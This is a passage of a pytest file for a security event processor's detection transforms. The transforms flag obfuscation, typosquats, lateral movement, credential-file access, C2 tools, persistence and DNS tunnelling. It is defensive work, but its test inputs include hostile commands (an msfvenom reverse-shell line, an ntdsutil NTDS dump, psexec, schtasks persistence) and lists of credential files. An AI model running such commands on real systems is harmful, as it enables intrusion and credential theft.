        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            logger=test_logger
        )
        
        md5_code = """def transform(param):
    import re
    match = re.search(r'MD5=([A-Fa-f0-9]{32})', param)
    return match.group(1) if match else ''"""
        
        sha256_code = """def transform(param):
    import re
    match = re.search(r'SHA256=([A-Fa-f0-9]{64})', param)
    return match.group(1) if match else ''"""
        
        hashes = "MD5=d41d8cd98f00b204e9800998ecf8427e,SHA256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        
        md5_result = processor._transform_value(md5_code, hashes)
        assert md5_result == "d41d8cd98f00b204e9800998ecf8427e"
        
        sha256_result = processor._transform_value(sha256_code, hashes)
        assert sha256_result == "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    
    def test_powershell_obfuscation_detection(self, tmp_path, test_logger):
        """Test PowerShell obfuscation indicator detection."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            logger=test_logger
        )
        
        obfuscation_code = r"""def transform(param):
    import re
    indicators = []
    
    if re.search(r'`[A-Za-z]', param):
        indicators.append('CHAR_SUBST')
    
    if re.search(r"'[^']+'\s*\+\s*'[^']+'", param):
        indicators.append('STR_CONCAT')
    
    if re.search(r'-[eE][nN][cC]', param):
        indicators.append('ENC_CMD')
    
    return '|'.join(indicators) if indicators else ''"""
        
        # Test character substitution
        result = processor._transform_value(obfuscation_code, "I`E`X")
        assert "CHAR_SUBST" in result
        
        # Test string concatenation
        result = processor._transform_value(obfuscation_code, "'Inv' + 'oke'")
        assert "STR_CONCAT" in result
        
        # Test encoded command
        result = processor._transform_value(obfuscation_code, "powershell -enc SGVsbG8=")
        assert "ENC_CMD" in result
        
        # Test clean script
        result = processor._transform_value(obfuscation_code, "Get-Process")
        assert result == ""
    
    def test_process_typosquat_detection_transform(self, tmp_path, test_logger):
        """Test typosquatted process name detection with false positive prevention."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            logger=test_logger
        )
        
        # Typosquat detection with whitelist for false positive prevention
        typosquat_code = """def transform(param):
    # Targets for typosquatting detection
    typosquat_targets = ['svchost', 'lsass', 'csrss', 'services', 'explorer',
                         'powershell', 'certutil', 'rundll32', 'chrome']
    
    # Whitelist: legitimate executables that should NEVER be flagged
    legit_whitelist = set(typosquat_targets + [
        'wevtutil', 'vssadmin', 'netstat', 'tasklist', 'systeminfo',
        'notepad', 'calc', 'mspaint', 'regedit'
    ])
    
    def edit_distance(s1, s2):
        if len(s1) < len(s2):
            return edit_distance(s2, s1)
        if len(s2) == 0:
            return len(s1)
        prev_row = list(range(len(s2) + 1))
        for i, c1 in enumerate(s1):
            curr_row = [i + 1]
            for j, c2 in enumerate(s2):
                insertions = prev_row[j + 1] + 1
                deletions = curr_row[j] + 1
                substitutions = prev_row[j] + (c1 != c2)
                curr_row.append(min(insertions, deletions, substitutions))
            prev_row = curr_row
        return prev_row[-1]
    
    exe_name = param.replace('\\\\', '/').split('/')[-1].lower()
    exe_name = exe_name.replace('.exe', '')
    
    if not exe_name or len(exe_name) < 4:
        return ''
    
    # Skip if in whitelist (prevents false positives)
    if exe_name in legit_whitelist:
        return ''
    
    for target in typosquat_targets:
        if len(target) < 5:
            continue
        dist = edit_distance(exe_name, target)
        max_dist = 1 if len(target) <= 7 else 2
        if 0 < dist <= max_dist:
            # Require suspicious patterns
            if any(c in exe_name for c in '01') or 'rn' in exe_name or 'vv' in exe_name:
                return 'TYPOSQUAT:' + target + '(HOMOGLYPH)'
            if abs(len(exe_name) - len(target)) == 1:
                return 'TYPOSQUAT:' + target + '(CHAR_MANIP)'
            if len(exe_name) == len(target) and dist == 1:
                return 'TYPOSQUAT:' + target + '(CHAR_SWAP)'
    return ''"""
        
        # Test svch0st (homoglyph for svchost) - should detect
        result = processor._transform_value(typosquat_code, "C:\\Windows\\svch0st.exe")
        assert "TYPOSQUAT:svchost" in result
        
        # Test 1sass (homoglyph for lsass) - should detect
        result = processor._transform_value(typosquat_code, "C:\\Temp\\1sass.exe")
        assert "TYPOSQUAT:lsass" in result
        
        # Test chr0me (homoglyph for chrome) - should detect
        result = processor._transform_value(typosquat_code, "C:\\Users\\chr0me.exe")
        assert "TYPOSQUAT:chrome" in result
        
        # Test legitimate process - should return empty
        result = processor._transform_value(typosquat_code, "C:\\Windows\\System32\\svchost.exe")
        assert result == ""
        
        # FALSE POSITIVE PREVENTION: wevtutil should NOT be flagged as certutil
        result = processor._transform_value(typosquat_code, "C:\\Windows\\System32\\wevtutil.exe")
        assert result == "", "wevtutil should not be flagged as typosquat of certutil"
        
        # FALSE POSITIVE PREVENTION: vssadmin should NOT be flagged
        result = processor._transform_value(typosquat_code, "C:\\Windows\\System32\\vssadmin.exe")
        assert result == "", "vssadmin should not be flagged as typosquat"
        
        # Test unrelated process - should return empty
        result = processor._transform_value(typosquat_code, "C:\\Program Files\\totally_random.exe")
        assert result == ""
    
    def test_domain_typosquat_detection_transform(self, tmp_path, test_logger):
        """Test typosquatted domain detection."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            logger=test_logger
        )
        
        # Simplified domain typosquat detection for testing
        typosquat_code = """def transform(param):
    official_domains = [
        ('microsoft', 'TECH'), ('google', 'TECH'), ('paypal', 'BANK'),
        ('irs', 'GOV_US'), ('amazon', 'TECH'), ('apple', 'TECH')
    ]
    
    def edit_distance(s1, s2):
        if len(s1) < len(s2):
            return edit_distance(s2, s1)
        if len(s2) == 0:
            return len(s1)
        prev_row = list(range(len(s2) + 1))
        for i, c1 in enumerate(s1):
            curr_row = [i + 1]
            for j, c2 in enumerate(s2):
                insertions = prev_row[j + 1] + 1
                deletions = curr_row[j] + 1
                substitutions = prev_row[j] + (c1 != c2)
                curr_row.append(min(insertions, deletions, substitutions))
            prev_row = curr_row
        return prev_row[-1]
    
    domain = param.rstrip('.').lower()
    parts = domain.split('.')
    if len(parts) < 2:
        return ''
    main_domain = parts[-2]
    
    if len(main_domain) < 3:
        return ''
    
    for legit, category in official_domains:
        if main_domain == legit:
            return ''
        if len(legit) < 3:
            continue
        dist = edit_distance(main_domain, legit)
        threshold = 1 if len(legit) <= 5 else 2
        if 0 < dist <= threshold:
            return 'TYPOSQUAT_' + category + ':' + legit
    return ''"""
        
        # Test micros0ft (homoglyph for microsoft)
        result = processor._transform_value(typosquat_code, "micros0ft.com")
        assert "TYPOSQUAT_TECH:microsoft" in result
        
        # Test paypa1 (homoglyph for paypal)
        result = processor._transform_value(typosquat_code, "paypa1.com")
        assert "TYPOSQUAT_BANK:paypal" in result
        
        # Test gooogle (extra char)
        result = processor._transform_value(typosquat_code, "gooogle.com")
        assert "TYPOSQUAT_TECH:google" in result
        
        # Test legitimate domain - should return empty
        result = processor._transform_value(typosquat_code, "microsoft.com")
        assert result == ""
        
        # Test unrelated domain - should return empty
        result = processor._transform_value(typosquat_code, "example.com")
        assert result == ""


class TestExtendedTransforms:
    """Tests for extended field value transforms."""

    def test_commandline_length_short(self, tmp_path, test_logger):
        """Test CommandLine_Length with a short command."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        code = """def transform(param):
    length = len(param)
    if length < 50:
        return 'SHORT:' + str(length)
    elif length < 200:
        return 'NORMAL:' + str(length)
    elif length < 500:
        return 'LONG:' + str(length)
    elif length < 1000:
        return 'VERY_LONG:' + str(length)
    else:
        return 'EXTREME:' + str(length)"""
        result = processor._transform_value(code, "whoami")
        assert result.startswith("SHORT:")
        assert "6" in result

    def test_commandline_length_extreme(self, tmp_path, test_logger):
        """Test CommandLine_Length with a very long command."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        code = """def transform(param):
    length = len(param)
    if length < 50:
        return 'SHORT:' + str(length)
    elif length < 200:
        return 'NORMAL:' + str(length)
    elif length < 500:
        return 'LONG:' + str(length)
    elif length < 1000:
        return 'VERY_LONG:' + str(length)
    else:
        return 'EXTREME:' + str(length)"""
        long_cmd = "powershell.exe -enc " + "A" * 1500
        result = processor._transform_value(code, long_cmd)
        assert result.startswith("EXTREME:")

    def test_commandline_entropy_low(self, tmp_path, test_logger):
        """Test CommandLine_EntropyScore with low entropy input."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        code = """def transform(param):
    if len(param) < 2:
        return 'LOW:0.00'
    n = len(param)
    freq_map = {}
    for c in param:
        freq_map[c] = freq_map.get(c, 0) + 1
    entropy = 0.0
    for count in freq_map.values():
        freq = count / n
        if freq > 0:
            entropy -= freq * math.log2(freq)
    score = round(entropy, 2)
    if score < 3.0:
        return 'LOW:' + str(score)
    elif score < 4.0:
        return 'MEDIUM:' + str(score)
    elif score < 4.5:
        return 'NORMAL:' + str(score)
    elif score < 5.0:
        return 'HIGH:' + str(score)
    else:
        return 'VERY_HIGH:' + str(score)"""
        result = processor._transform_value(code, "aaaaaaaaaa")
        assert result.startswith("LOW:")

    def test_commandline_entropy_high(self, tmp_path, test_logger):
        """Test CommandLine_EntropyScore with high entropy base64."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        code = """def transform(param):
    if len(param) < 2:
        return 'LOW:0.00'
    n = len(param)
    freq_map = {}
    for c in param:
        freq_map[c] = freq_map.get(c, 0) + 1
    entropy = 0.0
    for count in freq_map.values():
        freq = count / n
        if freq > 0:
            entropy -= freq * math.log2(freq)
    score = round(entropy, 2)
    if score < 3.0:
        return 'LOW:' + str(score)
    elif score < 4.0:
        return 'MEDIUM:' + str(score)
    elif score < 4.5:
        return 'NORMAL:' + str(score)
    elif score < 5.0:
        return 'HIGH:' + str(score)
    else:
        return 'VERY_HIGH:' + str(score)"""
        # Base64-like string has moderate-to-high entropy
        result = processor._transform_value(code, "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Qgb2Yg3ntr0py")
        # Should not be LOW (single-char) - verify meaningful entropy calculation
        assert not result.startswith("LOW:")
        assert ":" in result  # Should have category:score format

    def test_image_path_anomaly_temp(self, tmp_path, test_logger):
        """Test Image_PathAnomaly detects temp directory execution."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        code = r"""def transform(param):
    import re
    path_lower = param.lower().replace('\\', '/')
    findings = []
    if re.search(r'/temp/', path_lower):
        findings.append('TEMP_DIR')
    if '/windows/temp/' in path_lower:
        findings.append('WINDOWS_TEMP')
    if '/appdata/' in path_lower:
        findings.append('APPDATA')
    if re.search(r'/users/[^/]+/downloads/', path_lower):
        findings.append('DOWNLOADS')
    if '$recycle.bin' in path_lower or 'recycler' in path_lower:
        findings.append('RECYCLE_BIN')
    if '/users/public/' in path_lower:
        findings.append('PUBLIC_PROFILE')
    if '/perflogs/' in path_lower:
        findings.append('PERFLOGS')
    return '|'.join(findings[:3]) if findings else ''"""
        result = processor._transform_value(code, r"C:\Users\Public\malware.exe")
        assert "PUBLIC_PROFILE" in result

        result = processor._transform_value(code, r"C:\Windows\Temp\evil.exe")
        assert "TEMP_DIR" in result
        assert "WINDOWS_TEMP" in result

        # Legitimate path should return empty
        result = processor._transform_value(code, r"C:\Windows\System32\svchost.exe")
        assert result == ""

    def test_targetfilename_double_extension(self, tmp_path, test_logger):
        """Test TargetFileName_DoubleExtension detects social engineering."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        code = r"""def transform(param):
    import re
    name = param.replace('\\', '/').split('/')[-1]
    match = re.search(
        r'\.(\w{2,5})\.(exe|scr|bat|cmd|com|pif|vbs|vbe|js|jse|wsh|wsf|ps1|msi|dll|hta|cpl)$',
        name, re.IGNORECASE
    )
    if match:
        return 'DOUBLE_EXT:' + match.group(1) + '.' + match.group(2).lower()
    return ''"""
        result = processor._transform_value(code, r"C:\Users\Bob\Downloads\invoice.pdf.exe")
        assert result == "DOUBLE_EXT:pdf.exe"

        result = processor._transform_value(code, r"C:\report.docx.scr")
        assert result == "DOUBLE_EXT:docx.scr"

        # Normal file - no double extension
        result = processor._transform_value(code, r"C:\Windows\System32\notepad.exe")
        assert result == ""

    def test_logontype_description(self, tmp_path, test_logger):
        """Test LogonType_Description maps IDs to labels."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        code = """def transform(param):
    logon_types = {
        '0': 'SYSTEM', '2': 'INTERACTIVE', '3': 'NETWORK',
        '4': 'BATCH', '5': 'SERVICE', '7': 'UNLOCK',
        '8': 'NETWORK_CLEARTEXT', '9': 'NEW_CREDENTIALS',
        '10': 'REMOTE_INTERACTIVE', '11': 'CACHED_INTERACTIVE',
        '12': 'CACHED_REMOTE_INTERACTIVE', '13': 'CACHED_UNLOCK',
    }
    val = str(param).strip()
    return logon_types.get(val, 'UNKNOWN:' + val)"""
        assert processor._transform_value(code, "3") == "NETWORK"
        assert processor._transform_value(code, "10") == "REMOTE_INTERACTIVE"
        assert processor._transform_value(code, "99") == "UNKNOWN:99"

    def test_image_staging_directory(self, tmp_path, test_logger):
        """Test Image_StagingDirectory detects staging paths."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        code = r"""def transform(param):
    import re
    path_lower = param.lower().replace('\\', '/')
    findings = []
    if '/programdata/' in path_lower:
        findings.append('STAGING:ProgramData')
    if '/windows/temp/' in path_lower:
        findings.append('STAGING:WindowsTemp')
    if re.match(r'^[a-z]:/temp/', path_lower):
        findings.append('STAGING:RootTemp')
    if '/perflogs/' in path_lower:
        findings.append('STAGING:PerfLogs')
    vendor_dirs = ['/intel/', '/dell/', '/hp/', '/lenovo/', '/nvidia/']
    for vd in vendor_dirs:
        if vd in path_lower and '/program files' not in path_lower:
            findings.append('STAGING:VendorFolder')
            break
    if '/users/public/' in path_lower:
        findings.append('STAGING:PublicProfile')
    if '$recycle.bin' in path_lower:
        findings.append('STAGING:RecycleBin')
    if path_lower.startswith('/tmp/') or path_lower.startswith('/var/tmp/'):
        findings.append('STAGING:LinuxTmp')
    if path_lower.startswith('/dev/shm/'):
        findings.append('STAGING:DevShm')
    return '|'.join(findings[:3]) if findings else ''"""
        result = processor._transform_value(code, r"C:\ProgramData\backdoor.exe")
        assert "STAGING:ProgramData" in result

        result = processor._transform_value(code, "/dev/shm/payload")
        assert "STAGING:DevShm" in result

        result = processor._transform_value(code, r"C:\Intel\update.exe")
        assert "STAGING:VendorFolder" in result

    def test_commandline_lateral_movement(self, tmp_path, test_logger):
        """Test CommandLine_LateralMovement detects lateral movement."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        code = r"""def transform(param):
    import re
    findings = []
    param_lower = param.lower()
    if re.search(r'psexec|paexec', param_lower):
        findings.append('LATERAL:PSEXEC')
    if re.search(r'wmic\s+/node:|invoke-wmimethod|invoke-cimmethod', param_lower):
        findings.append('LATERAL:WMI')
    if re.search(r'enter-pssession|invoke-command\s+.*-computername|winrs\s+', param_lower):
        findings.append('LATERAL:WINRM')
    if re.search(r'mstsc\s+/v:|cmdkey\s+/add:', param_lower):
        findings.append('LATERAL:RDP')
    if re.search(r'(net\s+use|copy|move|xcopy|robocopy)\s+\\\\', param_lower):
        findings.append('LATERAL:SMB')
    if re.search(r'\bssh\s+.*@|\bscp\s+.*:|plink\s+', param_lower):
        findings.append('LATERAL:SSH')
    return '|'.join(findings[:3]) if findings else ''"""
        result = processor._transform_value(code, "psexec.exe \\\\TARGET -s cmd.exe")
        assert "LATERAL:PSEXEC" in result

        result = processor._transform_value(code, "Enter-PSSession -ComputerName DC01")
        assert "LATERAL:WINRM" in result

        result = processor._transform_value(code, "whoami")
        assert result == ""

    def test_commandline_data_staging(self, tmp_path, test_logger):
        """Test CommandLine_DataStaging detects exfil staging."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        code = r"""def transform(param):
    import re
    findings = []
    param_lower = param.lower()
    if re.search(r'\brar\s+a\b|7z\s+a\b|\bzip\b.*-r|tar\s+(-czf|-cf|--create)|makecab|compact\s+/c', param_lower):
        findings.append('STAGING:ARCHIVE')
    if re.search(r'\brobocopy\b|\bxcopy\b.*(/s|/e)|\bcopy\b.*\*\.', param_lower):
        findings.append('STAGING:BULK_COPY')
    if re.search(r'sqlcmd\s+.*-[Qq]|mysqldump|pg_dump|sqlite3\s+.*\.dump', param_lower):
        findings.append('STAGING:DB_DUMP')
    if re.search(r'\.(pst|ost)\b', param_lower):
        findings.append('STAGING:EMAIL_COLLECT')
    if re.search(r'ntdsutil|secretsdump|dcsync', param_lower):
        findings.append('STAGING:AD_DUMP')
    return '|'.join(findings[:3]) if findings else ''"""
        result = processor._transform_value(code, "rar a C:\\temp\\data.rar C:\\Users\\*.docx")
        assert "STAGING:ARCHIVE" in result

        result = processor._transform_value(code, "ntdsutil 'ac i ntds' ifm 'create full c:\\temp'")
        assert "STAGING:AD_DUMP" in result

    def test_targetfilename_sensitive_file(self, tmp_path, test_logger):
        """Test TargetFileName_SensitiveFile flags credential access."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        code = r"""def transform(param):
    import re
    findings = []
    name_lower = param.lower().replace('\\', '/')
    fname = name_lower.split('/')[-1] if '/' in name_lower else name_lower
    cred_files = ['sam', 'system', 'security', 'ntds.dit', 'shadow', 'passwd', '.kdbx', '.keychain']
    for cf in cred_files:
        if cf in fname:
            findings.append('SENSITIVE:CREDENTIAL_STORE')
            break
    if 'ntds.dit' in name_lower:
        findings.append('SENSITIVE:NTDS')
    ssh_files = ['id_rsa', 'id_ed25519', 'known_hosts', 'authorized_keys']
    for sf in ssh_files:
        if sf in name_lower:
            findings.append('SENSITIVE:SSH_KEY')
            break
    if re.search(r'\.(pfx|p12|pem|key)$', name_lower):
        findings.append('SENSITIVE:CERT_PRIVATE')
    browser_files = ['login data', 'cookies', 'web data', 'logins.json']
    for bf in browser_files:
        if bf in name_lower:
            findings.append('SENSITIVE:BROWSER_DATA')
            break
    if re.search(r'lsass.*\.dmp|\.hdmp$|procdump', name_lower):
        findings.append('SENSITIVE:MEMORY_DUMP')
    return '|'.join(findings[:3]) if findings else ''"""
        result = processor._transform_value(code, r"C:\Windows\NTDS\ntds.dit")
        assert "SENSITIVE:NTDS" in result

        result = processor._transform_value(code, "/home/user/.ssh/id_rsa")
        assert "SENSITIVE:SSH_KEY" in result

        result = processor._transform_value(code, r"C:\temp\lsass.dmp")
        assert "SENSITIVE:MEMORY_DUMP" in result

        result = processor._transform_value(code, r"C:\temp\readme.txt")
        assert result == ""

    def test_parentimage_spawn_anomaly(self, tmp_path, test_logger):
        """Test ParentImage_SpawnAnomaly detects anomalous parents."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        code = r"""def transform(param):
    import re
    parent_lower = param.lower().replace('\\', '/').split('/')[-1]
    parent_lower = parent_lower.replace('.exe', '')
    findings = []
    office_apps = ['winword', 'excel', 'powerpnt', 'outlook', 'msaccess',
                   'mspub', 'visio', 'onenote', 'eqnedt32']
    if parent_lower in office_apps:
        findings.append('ANOMALY:OFFICE_SPAWN')
    browsers = ['chrome', 'firefox', 'msedge', 'iexplore', 'opera', 'brave']
    if parent_lower in browsers:
        findings.append('ANOMALY:BROWSER_SPAWN')
    pdf_apps = ['acrord32', 'acrobat', 'foxitreader']
    if parent_lower in pdf_apps:
        findings.append('ANOMALY:PDF_SPAWN')
    script_engines = ['wscript', 'cscript', 'mshta']
    if parent_lower in script_engines:
        findings.append('ANOMALY:SCRIPT_CHAIN')
    if parent_lower in ['wmiprvse']:
        findings.append('ANOMALY:WMI_SPAWN')
    return '|'.join(findings[:2]) if findings else ''"""
        result = processor._transform_value(code, r"C:\Program Files\Microsoft Office\WINWORD.EXE")
        assert "ANOMALY:OFFICE_SPAWN" in result

        result = processor._transform_value(code, r"C:\Windows\System32\WmiPrvSE.exe")
        assert "ANOMALY:WMI_SPAWN" in result

        result = processor._transform_value(code, r"C:\Windows\explorer.exe")
        assert result == ""

    def test_commandline_c2_indicators_cobalt_strike(self, tmp_path, test_logger):
        """Test CommandLine_C2Indicators detects Cobalt Strike."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        code = r"""def transform(param):
    import re
    findings = []
    param_lower = param.lower()
    cs_indicators = [
        r'\bbeacon\b', r'\bspawn(to|as|x64|x86)\b',
        r'\\\\\.\\pipe\\msagent_', r'\\\\\.\\pipe\\postex_',
        r'/pixel[^a-z]|/submit\.php|/__utm\.gif|/activity',
        r'jump\s+(psexec|winrm|ssh)',
    ]
    for pat in cs_indicators:
        if re.search(pat, param_lower):
            findings.append('C2:COBALT_STRIKE')
            break
    if re.search(r'meterpreter|multi/handler|exploit/|payload/|msfvenom|lhost\s*=|lport\s*=', param_lower):
        findings.append('C2:METASPLOIT')
    return '|'.join(findings[:3]) if findings else ''"""
        result = processor._transform_value(code, "beacon.exe spawnto x64")
        assert "C2:COBALT_STRIKE" in result

        result = processor._transform_value(code, "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1")
        assert "C2:METASPLOIT" in result

        result = processor._transform_value(code, "notepad.exe")
        assert result == ""

    def test_commandline_persistence_category(self, tmp_path, test_logger):
        """Test CommandLine_PersistenceCategory categorizes persistence."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        code = r"""def transform(param):
    import re
    findings = []
    param_lower = param.lower()
    if re.search(r'schtasks\s+/create|new-scheduledtask|register-scheduledjob', param_lower):
        findings.append('PERSIST:SCHED_TASK')
    if re.search(r'sc\s+(create|config)\s|new-service\s|sc\.exe\s+(create|config)', param_lower):
        findings.append('PERSIST:SERVICE')
    if re.search(r'(reg\s+add|set-itemproperty|new-itemproperty).*\\(run|runonce)\b', param_lower):
        findings.append('PERSIST:REG_RUN')
    if re.search(r'__eventfilter|commandlineeventconsumer|__filtertoconsumerbinding', param_lower):
        findings.append('PERSIST:WMI_SUB')
    if re.search(r'crontab\s+-[ei]|/etc/cron\.|/var/spool/cron', param_lower):
        findings.append('PERSIST:CRON')
    if re.search(r'systemctl\s+(enable|daemon-reload)|/etc/systemd/', param_lower):
        findings.append('PERSIST:SYSTEMD')
    return '|'.join(findings[:3]) if findings else ''"""
        result = processor._transform_value(code, 'schtasks /create /tn "Update" /tr "C:\\malware.exe" /sc daily')
        assert "PERSIST:SCHED_TASK" in result

        result = processor._transform_value(code, "crontab -e")
        assert "PERSIST:CRON" in result

        result = processor._transform_value(code, "systemctl enable backdoor.service")
        assert "PERSIST:SYSTEMD" in result

    def test_queryname_subdomain_analysis(self, tmp_path, test_logger):
        """Test QueryName_SubdomainAnalysis detects tunneling patterns."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        code = r"""def transform(param):
    import re
    findings = []
    domain = param.rstrip('.')
    parts = domain.split('.')
    if len(parts) < 3:
        return ''
    common_cctld_sld = ['co', 'com', 'org', 'net', 'gov', 'ac', 'edu']
    if len(parts) >= 3 and parts[-2] in common_cctld_sld:
        subdomain_parts = parts[:-3]
    else:
        subdomain_parts = parts[:-2]
    if not subdomain_parts:
        return ''
    subdomain = '.'.join(subdomain_parts)
    depth = len(subdomain_parts)
    if depth > 3:
        findings.append('DNS:DEEP_SUB:' + str(depth))
    if len(subdomain) > 30:
        findings.append('DNS:LONG_SUB:' + str(len(subdomain)))
    if re.search(r'[0-9a-f]{16,}', subdomain, re.IGNORECASE):
        findings.append('DNS:HEX_SUBDOMAIN')
    if len(subdomain) > 10:
        clean = subdomain.replace('.', '').lower()
        if clean:
            freq_map = {}
            for c in clean:
                freq_map[c] = freq_map.get(c, 0) + 1
            ent = 0.0
            for cnt in freq_map.values():
                f = cnt / len(clean)
                if f > 0:
                    ent -= f * math.log2(f)
            if ent > 3.5 and len(clean) > 15:
                findings.append('DNS:HIGH_ENTROPY_SUB')
    return '|'.join(findings[:4]) if findings else ''"""
        # DNS tunneling-like pattern with hex subdomain
        result = processor._transform_value(code, "aabbccdd00112233445566778899.evil.com")
        assert "DNS:HEX_SUBDOMAIN" in result

        # Long subdomain triggers LONG_SUB
        result = processor._transform_value(code, "aabbccdd00112233445566778899aabbcc0011.evil.com")
        assert "DNS:LONG_SUB" in result

        # Deep subdomain nesting
        result = processor._transform_value(code, "a.b.c.d.e.evil.com")
        assert "DNS:DEEP_SUB" in result

        # Normal subdomain - no findings
        result = processor._transform_value(code, "www.google.com")
        assert result == ""

    def test_commandline_recon_indicators(self, tmp_path, test_logger):
        """Test CommandLine_ReconIndicators detects recon commands."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        code = r"""def transform(param):
    import re
    findings = []
    param_lower = param.lower()
    if re.search(r'\bsysteminfo\b|\bhostname\b|\buname\s+-a\b', param_lower):
        findings.append('RECON:SYSINFO')
